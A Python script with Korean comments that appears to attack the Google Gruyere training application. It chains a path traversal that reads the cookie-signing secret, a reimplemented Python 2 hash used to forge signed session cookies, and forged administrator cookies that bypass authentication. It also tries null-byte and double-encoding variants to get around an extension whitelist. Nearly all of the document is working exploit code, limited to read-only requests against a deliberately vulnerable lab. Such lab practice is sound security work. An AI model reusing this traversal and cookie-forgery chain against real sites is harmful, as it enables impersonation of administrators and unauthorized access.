#!/usr/bin/env python3
"""Round 2 최종 — 경로이탈(secret.txt) → 쿠키 서명 위조 → 인증 우회/권한 상승 체인 실증.

체인:
  1. /%2e%2e%2fsecret.txt  → cookie_secret = "Cookie!\\n" 탈취
  2. 서명 = py2_hash(secret + "<uid>|<admin>|<author>") & 0x7FFFFFF  (4/4 실측 일치로 검증)
  3. 임의 uid/권한으로 쿠키 위조 → 서버가 정상 쿠키로 신뢰

모두 GET(읽기 전용) 검증만 한다. /reset·/quit 등 상태변경/DoS 엔드포인트는 호출하지 않는다.
"""
from __future__ import annotations

import re
import subprocess
from pathlib import Path

SCRATCH = Path(__file__).resolve().parent.parent / "scratch"
EVIDENCE = Path(__file__).resolve().parent.parent / "evidence"
EVIDENCE.mkdir(exist_ok=True)
GID = (SCRATCH / "gid.txt").read_text().strip().split("=", 1)[1]
BASE = f"https://google-gruyere.appspot.com/{GID}"
CA = "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"
MASK = 0x7FFFFFF
SECRET = "Cookie!\n"


def py2_hash(s: str) -> int:
    if not s:
        return 0
    x = ord(s[0]) << 7
    for ch in s:
        x = ((1000003 * x) ^ ord(ch)) & ((1 << 64) - 1)
    x = (x ^ len(s)) & ((1 << 64) - 1)
    return x - (1 << 64) if x >= 1 << 63 else x


def sign(cookie_data: str, secret: str = SECRET) -> str:
    return f"{py2_hash(secret + cookie_data) & MASK}"


def fetch(path: str, cookie: str | None = None) -> str:
    cmd = ["curl", "-s", "--path-as-is", "--max-time", "30",
           "-x", "http://127.0.0.1:8080", "--cacert", CA, BASE + path]
    if cookie:
        cmd += ["-H", f"Cookie: {cookie}"]
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def dump_cookie_field(html: str) -> str:
    m = re.search(r"_cookie:&nbsp;</td>\s*<td valign='top'><pre>(.*?)</pre>", html, re.S)
    return m.group(1).strip() if m else "?"


def main() -> None:
    rep = []
    rep.append(f"GID={GID}\nBASE={BASE}\n")

    # --- 0. secret 재확인 (체인 1단계) ---
    secret_body = fetch("/%2e%2e%2fsecret.txt")
    rep.append("### 1) 경로이탈로 cookie_secret 탈취")
    rep.append(f"GET /%2e%2e%2fsecret.txt → {secret_body!r}")
    rep.append(f"cookie_secret 으로 사용: {SECRET!r}")

    # --- 1. 서명 알고리즘 검증 (대조군: 실제 로그인 쿠키와 일치해야 함) ---
    rep.append("\n### 2) 서명 재현 검증 (대조군)")
    for cdata, expected in (("brie||author", "74315992"),
                            ("administrator|admin|", "31131337"),
                            ("cheddar||author", "40461140"),
                            ("sardo||author", "22005508")):
        got = sign(cdata)
        rep.append(f"  cookie_data={cdata!r:24s} 재현={got:>10s} 실측={expected:>10s} "
                   f"{'일치' if got == expected else '불일치'}")

    # --- 2. 위조 쿠키로 인증 우회 (읽기 전용) ---
    rep.append("\n### 3) 위조 쿠키 검증 (읽기 전용 GET)")
    cases = [
        ("내 테스트 계정(brie)에 admin 승격", "brie|admin|author", False),
        ("administrator 계정 사칭(자격증명 없이)", "administrator|admin|author", True),
        ("is_admin 플래그를 빈 값으로 (대조군)", "administrator||author", False),
    ]
    for label, cdata, expect_admin in cases:
        cookie = f"GRUYERE={sign(cdata)}|{cdata}"
        dump = fetch("/dump.gtl", cookie)
        parsed = dump_cookie_field(dump)
        manage = "Manage this server" in fetch("/manage.gtl", cookie)
        newacc = fetch("/newaccount.gtl", cookie)
        admin_radios = "name='is_admin'" in newacc
        prof = fetch("/editprofile.gtl", cookie)
        admin_prof = "Add a new account or edit an existing account" in prof
        rep.append(f"\n  --- {label}")
        rep.append(f"      Cookie: {cookie}")
        rep.append(f"      /dump.gtl 이 서버가 파싱한 쿠키: {parsed}")
        rep.append(f"      /manage.gtl 관리자 링크 노출: {manage}")
        rep.append(f"      /newaccount.gtl 관리자 전용 is_admin 라디오: {admin_radios}")
        rep.append(f"      /editprofile.gtl 관리자 전용 UI: {admin_prof}")
        (EVIDENCE / f"authbypass_{cdata.replace('|', '_') or 'empty'}.txt").write_text(
            f"# {label}\nCookie: {cookie}\n\n## /dump.gtl\n{dump}\n\n## /newaccount.gtl\n{newacc}\n",
            encoding="utf-8", errors="replace")
        if expect_admin:
            ok = ("'is_admin': True" in parsed.replace('"', "'")) and admin_radios
            rep.append(f"      >>> 관리자 권한 획득 확인: {ok}")

    # --- 3. 확장자 화이트리스트 우회 변형 (null byte) ---
    rep.append("\n### 4) 확장자 화이트리스트 우회 변형 (.py/.yaml/.bak 읽기 시도)")
    for label, path in (
        ("null byte 로 .py 위장", "/%2e%2e%2fdata.py%00.txt"),
        ("null byte 로 .bak 위장", "/%2e%2e%2fapp.yaml%00.txt"),
        ("trailing dot+txt", "/%2e%2e%2fdata.py.txt"),
        ("이중 인코딩 %252e", "/%252e%252e%252fdata.py.txt"),
        ("대문자 확장자", "/%2e%2e%2fDATA.PY.txt"),
    ):
        body = fetch(path)
        note = "Invalid request" if "Invalid request" in body else (
            "Unrecognized file type" if "Unrecognized file type" in body else f"len={len(body)}")
        rep.append(f"  {label:26s} {path:34s} → {note}  {body.strip()[:70]!r}")

    out = "\n".join(rep)
    (EVIDENCE / "round2_authbypass_chain.txt").write_text(out, encoding="utf-8")
    print(out)


if __name__ == "__main__":
    main()
